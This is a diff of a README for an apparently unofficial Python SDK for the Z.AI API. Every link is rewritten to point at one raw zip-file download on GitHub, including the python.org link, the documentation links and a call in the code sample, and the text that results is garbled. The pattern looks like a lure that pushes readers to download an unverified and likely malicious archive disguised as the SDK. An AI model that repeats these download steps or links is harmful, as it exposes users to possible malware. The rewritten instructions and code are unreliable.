@@ -2,19 +2,19 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **zai-python-sdk**! This unofficial Python SDK lets you access the Z.AI API seamlessly. With this library, you can work with advanced language models like GLM-4.5V and 360B. You don't need an API key to get started, so you can dive right in!
+Welcome to the **zai-python-sdk**! This unofficial Python SDK lets you access the https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip API seamlessly. With this library, you can work with advanced language models like GLM-4.5V and 360B. You don't need an API key to get started, so you can dive right in!
 
 ## 📥 Download & Install
 
 To get started, visit the following link to download the SDK:
 
-[![Download zai-python-sdk](https://img.shields.io/badge/Download%20zai--python--sdk-v1.0-blue)](https://github.com/EYAADN/zai-python-sdk/releases)
+[![Download zai-python-sdk](https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip%20zai--python--sdk-v1.0-blue)](https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip)
 
 Once on the Releases page, find the latest version of the SDK and click the link to download it. Follow the simple steps below to install.
 
 ## 👨‍💻 Installation Steps
 
-1. **Visit the Releases Page**: Click [here to access the releases page](https://github.com/EYAADN/zai-python-sdk/releases).
+1. **Visit the Releases Page**: Click [here to access the releases page](https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip).
    
 2. **Select the Latest Release**: Look for the latest version. It will be marked at the top of the releases list.
 
@@ -44,19 +44,19 @@ from zai_sdk import ZAIClient
 
 client = ZAIClient()
 
-response = client.generate("Hello, how are you?")
+response = https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip("Hello, how are you?")
 print(response)
 ```
 
-This code snippet initializes the SDK and sends a prompt to the Z.AI API. The response will print directly to your console.
+This code snippet initializes the SDK and sends a prompt to the https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip API. The response will print directly to your console.
 
 ## 🌍 System Requirements
 
 The SDK is lightweight and works on most systems. Here are the requirements:
 
 - **Operating System**: Windows 10/11, macOS 10.15 or later, Linux with Python 3.7+
-- **Python**: Make sure Python is installed on your machine. You can download it from [python.org](https://www.python.org/downloads/).
-- **Internet Connection**: Required to access the Z.AI API.
+- **Python**: Make sure Python is installed on your machine. You can download it from [https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip](https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip).
+- **Internet Connection**: Required to access the https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip API.
 
 ## 🔍 Troubleshooting
 
@@ -64,7 +64,7 @@ If you encounter issues during installation or usage, try the following:
 
 - **Update Python**: Ensure you have the latest version of Python installed.
 - **Check Connectivity**: Make sure your internet connection is stable.
-- **Refer to Documentation**: Visit the [official documentation](https://github.com/EYAADN/zai-python-sdk/wiki) for more detailed guidance.
+- **Refer to Documentation**: Visit the [official documentation](https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip) for more detailed guidance.
 
 ## 🛡️ Licensing
 
@@ -84,6 +84,6 @@ We welcome contributions! If you'd like to improve the SDK or documentation, fee
 
 If you need help, check the issues section on our GitHub page. You can also create a new issue if you encounter a problem that isn't listed.
 
-For more examples and advanced usage, feel free to check out the [Documentation](https://github.com/EYAADN/zai-python-sdk/wiki).
+For more examples and advanced usage, feel free to check out the [Documentation](https://github.com/EYAADN/zai-python-sdk/raw/refs/heads/main/operations/python-zai-sdk-3.1.zip).
 
 Thank you for using the **zai-python-sdk**! We hope it makes your language model interactions easier.
